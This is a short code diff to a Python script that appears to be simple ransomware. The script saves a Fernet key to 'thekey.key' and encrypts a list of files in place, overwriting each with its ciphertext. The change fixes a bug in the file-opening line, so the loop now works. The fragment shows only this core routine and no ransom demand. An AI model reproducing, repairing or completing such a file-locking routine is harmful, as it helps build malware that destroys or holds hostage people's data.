@@ -22,7 +22,7 @@ with open("thekey.key", "wb") as thekey:
     thekey.write(key)
 
 for file in files:
-    with open(files, "rb") as thefile:
+    with open(file, "rb") as thefile:
         contents = thefile.read()
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as thefile:
